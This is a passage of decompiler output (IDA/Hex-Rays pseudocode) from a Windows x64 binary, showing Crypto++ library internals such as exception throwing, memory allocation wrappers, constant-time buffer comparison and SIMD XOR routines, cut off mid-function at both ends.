    result = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v4 + 168i64))(v4, v2);
  }
  else
  {
    if ( !(dword_1400DA840 & 1) )
    {
      dword_1400DA840 |= 1u;
      qword_1400DA828 = (__int64)&off_1400A87C8;
      qword_1400DA830 = (__int64)off_1400A9A98;
      atexit(sub_1400A0060);
    }
    v7 = v2;
    v6 = 1;
    (*(void (__fastcall **)(__int64, __int64 *, __int64 *, void **, char))(*(_QWORD *)v3 + 248i64))(
      v3,
      &qword_1400DA828,
      &v7,
      &qword_1400D8080,
      v6);
    result = v7;
  }
  return result;
}
// 1400A87C8: using guessed type __int64 (__fastcall *off_1400A87C8)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400DA828: using guessed type __int64 qword_1400DA828;
// 1400DA830: using guessed type __int64 qword_1400DA830;
// 1400DA840: using guessed type int dword_1400DA840;

//----- (00000001400393B0) ----------------------------------------------------
__int64 __fastcall sub_1400393B0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax
  __int64 result; // rax

  v1 = a1;
  if ( (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))() )
  {
    v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 328i64))(v1);
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 216i64))(v2);
  }
  else
  {
    while ( (*(unsigned int (__fastcall **)(__int64, signed __int64))(*(_QWORD *)v1 + 208i64))(v1, 0xFFFFFFFFi64) )
      ;
    do
      result = (*(__int64 (__fastcall **)(__int64, signed __int64))(*(_QWORD *)v1 + 168i64))(v1, -1i64);
    while ( result );
  }
  return result;
}

//----- (00000001400394F0) ----------------------------------------------------
void __fastcall sub_1400394F0(__int64 a1, __int64 a2)
{
  char v2; // [rsp+28h] [rbp-80h]
  __int64 v3; // [rsp+38h] [rbp-70h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v5)(void *); // [rsp+50h] [rbp-58h]
  int v6; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v8; // [rsp+80h] [rbp-28h]
  __int64 v9; // [rsp+88h] [rbp-20h]

  if ( !a2 && (*(unsigned int (__cdecl **)(__int64))(*(_QWORD *)a1 + 56i64))(a1) == 2 )
  {
    v4 = 15i64;
    v3 = 0i64;
    v2 = 0;
    sub_140004F20(&v2, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v5);
    v5 = &off_1400A8798;
    v6 = 1;
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v5 = &off_1400A8798;
    CxxThrowException(&v5, &_TI3_AVcls_001_CryptoPP__);
  }
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (00000001400395E0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400395E0(_QWORD *a1, int a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rax
  unsigned __int64 v5; // rdi
  char v6; // [rsp+20h] [rbp-21h]
  __int64 v7; // [rsp+30h] [rbp-11h]
  __int64 v8; // [rsp+38h] [rbp-9h]
  __int64 (__fastcall **v9)(void *); // [rsp+48h] [rbp+7h]
  int v10; // [rsp+60h] [rbp+1Fh]
  char Dst; // [rsp+68h] [rbp+27h]
  __int64 v12; // [rsp+78h] [rbp+37h]
  __int64 v13; // [rsp+80h] [rbp+3Fh]

  v2 = a1;
  v3 = *a1;
  if ( a2 < 0 )
    return (*(unsigned int (**)(void))(v3 + 64))();
  v5 = a2;
  if ( a2 < (unsigned __int64)(*(unsigned int (**)(void))(v3 + 72))() )
  {
    v8 = 15i64;
    v7 = 0i64;
    v6 = 0;
    sub_140004F20(&v6, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v9);
    v9 = &off_1400A8798;
    v10 = 1;
    v13 = 15i64;
    v12 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v9 = &off_1400A8798;
    CxxThrowException(&v9, &_TI3_AVcls_001_CryptoPP__);
  }
  if ( v5 > (*(unsigned int (__fastcall **)(_QWORD *))(*v2 + 80i64))(v2) )
  {
    v8 = 15i64;
    v7 = 0i64;
    v6 = 0;
    sub_140004F20(&v6, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v9);
    v9 = &off_1400A8798;
    v10 = 1;
    v13 = 15i64;
    v12 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v9 = &off_1400A8798;
    CxxThrowException(&v9, &_TI3_AVcls_001_CryptoPP__);
  }
  return v5;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140039770) ----------------------------------------------------
__int64 __fastcall sub_140039770(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 result; // rax
  __int64 v5; // rax
  _QWORD *v6; // rax
  char v7; // [rsp+28h] [rbp-80h]
  char v8; // [rsp+50h] [rbp-58h]

  v2 = a2;
  v3 = a1;
  result = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)a1 + 40i64))(a1);
  if ( !(_BYTE)result )
  {
    v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 104i64))(v3);
    v6 = (_QWORD *)(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v5 + 16i64))(v5, &v7);
    sub_140036F60((std::exception *)&v8, v6, v2);
    CxxThrowException(&v8, &_TI4_AVcls_038_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3F60: using guessed type int _TI4_AVcls_038_CryptoPP__;

//----- (0000000140039810) ----------------------------------------------------
__int64 __fastcall sub_140039810(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  __int64 result; // rax
  char v4; // [rsp+28h] [rbp-80h]
  __int64 v5; // [rsp+38h] [rbp-70h]
  __int64 v6; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v7)(void *); // [rsp+50h] [rbp-58h]
  int v8; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v10; // [rsp+80h] [rbp-28h]
  __int64 v11; // [rsp+88h] [rbp-20h]

  v2 = a2;
  result = (*(unsigned int (__cdecl **)(__int64))(*(_QWORD *)a1 + 56i64))(a1);
  if ( v2 > (unsigned int)result )
  {
    v6 = 15i64;
    v5 = 0i64;
    v4 = 0;
    sub_140004F20(&v4, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v7);
    v7 = &off_1400A8798;
    v8 = 1;
    v11 = 15i64;
    v10 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v7 = &off_1400A8798;
    CxxThrowException(&v7, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140039900) ----------------------------------------------------
__int64 __fastcall sub_140039900(__int64 a1)
{
  __int64 result; // rax
  char v2; // [rsp+28h] [rbp-80h]
  __int64 v3; // [rsp+38h] [rbp-70h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v5)(void *); // [rsp+50h] [rbp-58h]
  int v6; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v8; // [rsp+80h] [rbp-28h]
  __int64 v9; // [rsp+88h] [rbp-20h]

  result = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)a1 + 56i64))(a1);
  if ( (signed int)result < 4 )
  {
    v4 = 15i64;
    v3 = 0i64;
    v2 = 0;
    sub_140004F20(&v2, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v5);
    v5 = &off_1400A8798;
    v6 = 1;
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v5 = &off_1400A8798;
    CxxThrowException(&v5, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (00000001400399F0) ----------------------------------------------------
__int64 __fastcall sub_1400399F0(__int64 *a1)
{
  __int64 *v1; // rbx
  bool v2; // zf
  __int64 v3; // rax
  __int64 v4; // rax

  v1 = a1;
  v2 = (*(__int64 (**)(void))(*a1 + 320))() == 0;
  v3 = *v1;
  if ( v2 )
    return (*(__int64 (__fastcall **)(__int64 *))(v3 + 120))(v1);
  v4 = (*(__int64 (__fastcall **)(__int64 *))(v3 + 320))(v1);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 176i64))(v4);
}

//----- (0000000140039A30) ----------------------------------------------------
__int64 __fastcall sub_140039A30(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  char v4; // si
  __int64 v5; // rbp
  __int64 v6; // rdi
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 result; // rax
  unsigned int v11; // eax
  __int64 v12; // rax
  unsigned int v13; // er14
  __int64 v14; // rax
  int v15; // eax
  int v16; // ecx
  __int64 v17; // [rsp+20h] [rbp-48h]
  __int64 v18; // [rsp+28h] [rbp-40h]
  __int64 v19; // [rsp+30h] [rbp-38h]
  __int64 v20; // [rsp+38h] [rbp-30h]
  int v21; // [rsp+70h] [rbp+8h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))() )
  {
    do
      v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 328i64))(v7);
    while ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 328i64))(v7) );
  }
  do
  {
    v8 = *(_QWORD *)v7;
    v21 = -1;
    if ( (*(__int64 (__fastcall **)(__int64))(v8 + 328))(v7) )
    {
      v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 328i64))(v7);
      result = sub_140039C00(v9, v6, (unsigned int *)&v21, v5, v4);
      if ( result )
        return result;
    }
    else
    {
      v13 = v21;
      v21 = 0;
      if ( !v13 )
        goto LABEL_7;
      while ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v7 + 192i64))(v7) )
      {
        while ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v7 + 128i64))(v7) )
        {
          v14 = *(_QWORD *)v7;
          v20 = -1i64;
          result = (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64))(v14 + 248))(v7, v6, &v20, v5);
          if ( result )
            return result;
        }
        v15 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 112i64))(v7);
        if ( v15 >= 0 )
          v16 = v15 + 1;
        else
          v16 = -1;
        LOBYTE(v18) = v4;
        LODWORD(v17) = v16;
        if ( (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD, __int64, __int64))(*(_QWORD *)v6 + 272i64))(
               v6,
               v5,
               0i64,
               0i64,
               v17,
               v18) )
        {
          return 1i64;
        }
        (*(void (__fastcall **)(__int64))(*(_QWORD *)v7 + 200i64))(v7);
        v11 = v21 + 1;
        v21 = v11;
        if ( v11 >= v13 )
          goto LABEL_6;
      }
    }
    v11 = v21;
LABEL_6:
    ;
  }
  while ( v11 );
  do
  {
LABEL_7:
    v12 = *(_QWORD *)v7;
    v19 = 0xFFFFFFFFi64;
    LOBYTE(v17) = v4;
    result = (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64, __int64))(v12 + 248))(
               v7,
               v6,
               &v19,
               v5,
               v17);
  }
  while ( !result && v19 );
  return result;
}

//----- (0000000140039C00) ----------------------------------------------------
__int64 __fastcall sub_140039C00(__int64 a1, __int64 a2, unsigned int *a3, __int64 a4, char a5)
{
  __int64 v5; // rbp
  unsigned int *v6; // r14
  __int64 v7; // rdi
  __int64 v8; // rbx
  unsigned int v9; // er15
  char v10; // si
  __int64 v11; // rax
  __int64 result; // rax
  int v13; // eax
  int v14; // ecx
  __int64 v15; // [rsp+20h] [rbp-28h]
  _QWORD v16[4]; // [rsp+28h] [rbp-20h]
  __int64 v17; // [rsp+50h] [rbp+8h]

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))() )
  {
    do
      v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 328i64))(v8);
    while ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 328i64))(v8) );
  }
  v9 = *v6;
  *v6 = 0;
  if ( v9 )
  {
    v10 = a5;
    while ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v8 + 192i64))(v8) )
    {
      while ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v8 + 128i64))(v8) )
      {
        v11 = *(_QWORD *)v8;
        v17 = -1i64;
        result = (*(__int64 (__fastcall **)(__int64, __int64, __int64 *, __int64))(v11 + 248))(v8, v7, &v17, v5);
        if ( result )
          return result;
      }
      v13 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 112i64))(v8);
      if ( v13 >= 0 )
        v14 = v13 + 1;
      else
        v14 = -1;
      LOBYTE(v16[0]) = v10;
      LODWORD(v15) = v14;
      if ( (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD, __int64, _QWORD))(*(_QWORD *)v7 + 272i64))(
             v7,
             v5,
             0i64,
             0i64,
             v15,
             v16[0]) )
      {
        return 1i64;
      }
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v8 + 200i64))(v8);
      if ( ++*v6 >= v9 )
        return 0i64;
    }
  }
  return 0i64;
}

//----- (0000000140039D50) ----------------------------------------------------
__int64 __fastcall sub_140039D50(__int64 a1, __int64 a2, _QWORD *a3)
{
  *a3 = 0i64;
  return 0i64;
}

//----- (0000000140039D60) ----------------------------------------------------
_BOOL8 __fastcall sub_140039D60(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rsi
  __int64 v4; // r14
  __int64 v5; // rbx
  void *v6; // rbp
  bool v7; // bl

  v3 = a3;
  v4 = a2;
  v5 = a1;
  sub_140039810(a1, a3);
  sub_1400255A0(v3);
  if ( v3 )
    v6 = sub_14003A000(v3);
  else
    v6 = 0i64;
  (*(void (__fastcall **)(__int64, void *, unsigned __int64))(*(_QWORD *)v5 + 112i64))(v5, v6, v3);
  v7 = sub_14003A0A0((__int64)v6, v4, v3);
  memset(v6, 0, v3);
  free(v6);
  return v7;
}

//----- (0000000140039E10) ----------------------------------------------------
__int64 __fastcall sub_140039E10(__int64 a1, void (__fastcall ***a2)(_QWORD, signed __int64))
{
  void (__fastcall ***v2)(_QWORD, signed __int64); // rbx
  __int64 v3; // rdi

  v2 = a2;
  v3 = (*(unsigned __int8 (__cdecl **)(__int64))(*(_QWORD *)a1 + 96i64))(a1);
  if ( v2 )
    (**v2)(v2, 1i64);
  return (unsigned __int8)v3;
}

//----- (0000000140039E60) ----------------------------------------------------
__int64 __fastcall sub_140039E60(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // r14
  __int64 v9; // rbx
  __int64 v10; // rdi

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  v9 = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)a1 + 72i64))(a1);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v8 + 80i64))(v8, v9, v5, a5);
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v9 + 24i64))(v9, v7, v6);
  v10 = (*(unsigned __int8 (__fastcall **)(__int64, __int64))(*(_QWORD *)v8 + 96i64))(v8, v9);
  (**(void (__fastcall ***)(__int64, signed __int64))v9)(v9, 1i64);
  return (unsigned __int8)v10;
}

//----- (0000000140039F50) ----------------------------------------------------
void *__fastcall sub_140039F50(size_t Size)
{
  size_t v1; // rdi
  void *result; // rax
  void (*v3)(void); // rax
  void (*v4)(void); // rbx
  void *v5; // [rsp+20h] [rbp-28h]
  const char *v6; // [rsp+58h] [rbp+10h]

  v1 = Size;
  for ( result = aligned_malloc(Size, 0x10ui64); !result; result = aligned_malloc(v1, 0x10ui64) )
  {
    v3 = std::set_new_handler(0i64);
    v4 = v3;
    if ( !v3 )
    {
      v6 = "bad allocation";
      std::exception::exception((std::exception *)&v5, &v6, 1);
      v5 = &loc_1400A3C88;
      CxxThrowException(&v5, &_TI2_AVbad_alloc_std__);
    }
    std::set_new_handler(v3);
    v4();
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1518: using guessed type void (*__stdcall std::set_new_handler(void (*)(void)))(void);
// 1400A1990: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *, _DWORD);
// 1400D4118: using guessed type int _TI2_AVbad_alloc_std__;

//----- (000000014003A000) ----------------------------------------------------
void *__fastcall sub_14003A000(size_t Size)
{
  size_t v1; // rdi
  void *result; // rax
  void (*v3)(void); // rax
  void (*v4)(void); // rbx
  void *v5; // [rsp+20h] [rbp-28h]
  const char *v6; // [rsp+58h] [rbp+10h]

  v1 = Size;
  for ( result = malloc(Size); !result; result = malloc(v1) )
  {
    v3 = std::set_new_handler(0i64);
    v4 = v3;
    if ( !v3 )
    {
      v6 = "bad allocation";
      std::exception::exception((std::exception *)&v5, &v6, 1);
      v5 = &loc_1400A3C88;
      CxxThrowException(&v5, &_TI2_AVbad_alloc_std__);
    }
    std::set_new_handler(v3);
    v4();
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1518: using guessed type void (*__stdcall std::set_new_handler(void (*)(void)))(void);
// 1400A1990: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *, _DWORD);
// 1400D4118: using guessed type int _TI2_AVbad_alloc_std__;

//----- (000000014003A0A0) ----------------------------------------------------
bool __fastcall sub_14003A0A0(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // r11
  unsigned __int64 v4; // rax
  __int64 v5; // rbx
  unsigned __int64 v6; // rsi
  __int64 v7; // r9
  __int64 v8; // rdi
  __int64 v9; // rcx
  signed __int64 v10; // rax
  unsigned __int64 v11; // r8
  signed __int64 v13; // r11
  signed __int64 v14; // rdx
  unsigned __int64 v15; // rsi
  int v16; // er9
  unsigned __int64 v17; // rbx
  signed __int64 v18; // rcx
  int v19; // eax
  signed __int64 v20; // rax
  signed __int64 v21; // r8
  signed __int64 v22; // r11
  signed __int64 v23; // rdx
  char v24; // cl
  signed __int64 v25; // r11
  char v26; // al

  v3 = a1;
  v4 = a3 >> 3;
  v5 = 0i64;
  v6 = 0i64;
  if ( a3 >> 3 )
  {
    v7 = a2;
    v6 = a3 >> 3;
    v8 = a1 - a2;
    do
    {
      v9 = *(_QWORD *)(v8 + v7);
      v7 += 8i64;
      v5 |= *(_QWORD *)(v7 - 8) ^ v9;
      --v4;
    }
    while ( v4 );
  }
  v10 = 8 * v6;
  v11 = a3 - 8 * v6;
  if ( !v11 )
    return v5 == 0;
  v13 = v10 + v3;
  v14 = v10 + a2;
  v15 = 0i64;
  v16 = v5 | HIDWORD(v5);
  v17 = v11 >> 2;
  if ( v11 >> 2 )
  {
    v18 = v14;
    v15 = v11 >> 2;
    do
    {
      v19 = *(_DWORD *)(v18 + v13 - v14);
      v18 += 4i64;
      v16 |= *(_DWORD *)(v18 - 4) ^ v19;
      --v17;
    }
    while ( v17 );
  }
  v20 = 4 * v15;
  v21 = v11 - 4 * v15;
  if ( !v21 )
    return v16 == 0;
  v22 = v20 + v13;
  v23 = v20 + v14;
  v24 = v16 | BYTE1(v16) | BYTE2(v16) | HIBYTE(v16);
  if ( v21 )
  {
    v25 = v22 - v23;
    do
    {
      v26 = *(_BYTE *)(v23++ + v25);
      v24 |= *(_BYTE *)(v23 - 1) ^ v26;
      --v21;
    }
    while ( v21 );
  }
  return v24 == 0;
}

//----- (000000014003A1E0) ----------------------------------------------------
void __fastcall sub_14003A1E0(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // r10
  unsigned __int64 v6; // r11
  unsigned __int64 v7; // rdi
  unsigned __int64 v8; // rcx
  unsigned __int64 v9; // rcx
  signed __int64 v10; // rax
  unsigned __int64 v11; // rsi
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  unsigned __int64 v14; // r11
  signed __int64 v15; // rcx
  __int64 v16; // rax
  signed __int64 v17; // rdi
  unsigned __int64 v18; // r9
  unsigned __int64 v19; // r10
  unsigned __int64 v20; // rdx
  unsigned __int64 v21; // r8
  unsigned __int64 v22; // rdi
  unsigned __int64 v23; // r11
  unsigned __int64 v24; // rcx
  unsigned __int64 v25; // rcx
  signed __int64 v26; // rax
  unsigned __int64 v27; // rsi
  __m128i v28; // xmm0
  __m128i v29; // xmm1
  unsigned __int64 v30; // r11
  signed __int64 v31; // rcx
  int v32; // eax
  signed __int64 v33; // rdi
  unsigned __int64 v34; // r9
  unsigned __int64 v35; // r10
  const __m128i *v36; // rdx
  unsigned __int64 v37; // r8
  unsigned __int64 v38; // rcx
  unsigned __int64 v39; // rcx
  const __m128i *v40; // rax
  unsigned __int64 v41; // r11
  __m128i v42; // xmm0
  __m128i v43; // xmm1
  char *v44; // rdx
  unsigned __int64 v45; // r10
  unsigned __int64 v46; // rcx
  unsigned __int64 v47; // r9
  char v48; // al

  v4 = 0i64;
  v5 = a1;
  v6 = a4 >> 3;
  v7 = 0i64;
  if ( a4 >> 3 )
  {
    if ( v6 >= 4 )
    {
      v8 = a1 - 8 + 8 * v6;
      if ( (v5 > a3 - 8 + 8 * v6 || v8 < a3) && (v5 > a2 - 8 + 8 * v6 || v8 < a2) )
      {
        v9 = v5 - a2;
        v10 = a2 + 16;
        v11 = a3 - a2;
        do
        {
          v12 = _mm_loadu_si128((const __m128i *)(v10 - 16));
          v13 = _mm_loadu_si128((const __m128i *)(v11 + v10 - 16));
          v7 += 4i64;
          v10 += 32i64;
          _mm_storeu_si128((__m128i *)(v9 + v10 - 48), _mm_xor_si128(v13, v12));
          _mm_storeu_si128(
            (__m128i *)(v9 + v10 - 32),
            _mm_xor_si128(
              _mm_loadu_si128((const __m128i *)(v11 + v10 - 32)),
              _mm_loadu_si128((const __m128i *)(v10 - 32))));
        }
        while ( v7 < (a4 >> 3) - ((a4 >> 3) & 3) );
      }
    }
    if ( v7 < v6 )
    {
      v14 = v6 - v7;
      v15 = a3 + 8 * v7;
      v7 += v14;
      do
      {
        v16 = *(_QWORD *)(a2 - a3 + v15);
        v15 += 8i64;
        *(_QWORD *)(v5 - a3 + v15 - 8) = *(_QWORD *)(v15 - 8) ^ v16;
        --v14;
      }
      while ( v14 );
    }
  }
  v17 = 8 * v7;
  v18 = a4 - v17;
  if ( v18 )
  {
    v19 = v17 + v5;
    v20 = v17 + a2;
    v21 = v17 + a3;
    v22 = 0i64;
    v23 = v18 >> 2;
    if ( v18 >> 2 )
    {
      if ( v23 >= 8 )
      {
        v24 = v19 + 4 * (v23 - 1);
        if ( (v19 > v21 + 4 * (v23 - 1) || v24 < v21) && (v19 > v20 + 4 * (v23 - 1) || v24 < v20) )
        {
          v25 = v19 - v20;
          v26 = v20 + 16;
          v27 = v21 - v20;
          do
          {
            v28 = _mm_loadu_si128((const __m128i *)(v26 - 16));
            v29 = _mm_loadu_si128((const __m128i *)(v26 + v27 - 16));
            v22 += 8i64;
            v26 += 32i64;
            _mm_storeu_si128((__m128i *)(v26 + v25 - 48), _mm_xor_si128(v29, v28));
            _mm_storeu_si128(
              (__m128i *)(v26 + v25 - 32),
              _mm_xor_si128(
                _mm_loadu_si128((const __m128i *)(v26 + v27 - 32)),
                _mm_loadu_si128((const __m128i *)(v26 - 32))));
          }
          while ( v22 < (v18 >> 2) - ((v18 >> 2) & 7) );
        }
      }
      if ( v22 < v23 )
      {
        v30 = v23 - v22;
        v31 = v21 + 4 * v22;
        v22 += v30;
        do
        {
          v32 = *(_DWORD *)(v31 + v20 - v21);
          v31 += 4i64;
          *(_DWORD *)(v31 + v19 - v21 - 4) = *(_DWORD *)(v31 - 4) ^ v32;
          --v30;
        }
        while ( v30 );
      }
    }
    v33 = 4 * v22;
    v34 = v18 - v33;
    if ( v34 )
    {
      v35 = v33 + v19;
      v36 = (const __m128i *)(v33 + v20);
      v37 = v33 + v21;
      if ( v34 )
      {
        if ( v34 >= 0x20 )
        {
          v38 = v34 + v35 - 1;
          if ( (v35 > v34 + v37 - 1 || v38 < v37)
            && (v35 > (unsigned __int64)&v36[-1].m128i_u64[1] + v34 + 7 || v38 < (unsigned __int64)v36) )
          {
            v39 = v35 - (_QWORD)v36;
            v40 = v36;
            v41 = v37 - (_QWORD)v36;
            do
            {
              v42 = _mm_loadu_si128(v40);
              v43 = _mm_loadu_si128((const __m128i *)((char *)v40 + v41));
              v4 += 32i64;
              v40 += 2;
              _mm_storeu_si128((__m128i *)((char *)&v40[-2] + v39), _mm_xor_si128(v43, v42));
              _mm_storeu_si128(
                (__m128i *)((char *)&v40[-1] + v39),
                _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v40 + v41 - 16)), _mm_loadu_si128(v40 - 1)));
            }
            while ( v4 < v34 - (v34 & 0x1F) );
          }
        }
        if ( v4 < v34 )
        {
          v44 = (char *)v36->m128i_i64 - v37;
          v45 = v35 - v37;
          v46 = v4 + v37;
          v47 = v34 - v4;
          do
          {
            v48 = v44[v46++];
            *(_BYTE *)(v46 + v45 - 1) = *(_BYTE *)(v46 - 1) ^ v48;
            --v47;
          }
          while ( v47 );
        }
      }
    }
  }
}

//----- (000000014003A4B0) ----------------------------------------------------
void __fastcall sub_14003A4B0(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r11
  unsigned __int64 v4; // r10
  unsigned __int64 v5; // r9
  unsigned __int64 v6; // rbx
  unsigned __int64 v7; // rcx
  signed __int64 v8; // rax
  unsigned __int64 v9; // rcx
  __m128i v10; // xmm0
  __m128i v11; // xmm1
  unsigned __int64 v12; // r9
  signed __int64 v13; // rcx
  __int64 v14; // rax
  signed __int64 v15; // rbx
  unsigned __int64 v16; // r8
  unsigned __int64 v17; // r10
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // r9
  unsigned __int64 v20; // rbx
  signed __int64 v21; // rax
  unsigned __int64 v22; // rcx
  __m128i v23; // xmm0
  __m128i v24; // xmm1
  unsigned __int64 v25; // r9
  signed __int64 v26; // rcx
  int v27; // eax
  signed __int64 v28; // rbx
  unsigned __int64 v29; // r8
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // rdx
  const __m128i *v32; // rax
  unsigned __int64 v33; // rcx
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  unsigned __int64 v36; // rdx
  unsigned __int64 v37; // rcx
  unsigned __int64 v38; // r8
  char v39; // al

  v3 = 0i64;
  v4 = a1;
  v5 = a3 >> 3;
  v6 = 0i64;
  if ( a3 >> 3 )
  {
    if ( v5 >= 4 )
    {
      v7 = a1 - 8 + 8 * v5;
      if ( v4 > a2 - 8 + 8 * v5 || v7 < a2 )
      {
        v8 = v4 + 16;
        v9 = a2 - v4;
        do
        {
          v10 = _mm_loadu_si128((const __m128i *)(v8 - 16));
          v11 = _mm_loadu_si128((const __m128i *)(v9 + v8 - 16));
          v6 += 4i64;
          v8 += 32i64;
          _mm_storeu_si128((__m128i *)(v8 - 48), _mm_xor_si128(v11, v10));
          _mm_storeu_si128(
            (__m128i *)(v8 - 32),
            _mm_xor_si128(_mm_loadu_si128((const __m128i *)(v9 + v8 - 32)), _mm_loadu_si128((const __m128i *)(v8 - 32))));
        }
        while ( v6 < (a3 >> 3) - ((a3 >> 3) & 3) );
      }
    }
    if ( v6 < v5 )
    {
      v12 = v5 - v6;
      v13 = v4 + 8 * v6;
      v6 += v12;
      do
      {
        v14 = *(_QWORD *)(a2 - v4 + v13);
        v13 += 8i64;
        *(_QWORD *)(v13 - 8) ^= v14;
        --v12;
      }
      while ( v12 );
    }
  }
  v15 = 8 * v6;
  v16 = a3 - v15;
  if ( v16 )
  {
    v17 = v15 + v4;
    v18 = v15 + a2;
    v19 = v16 >> 2;
    v20 = 0i64;
    if ( v16 >> 2 )
    {
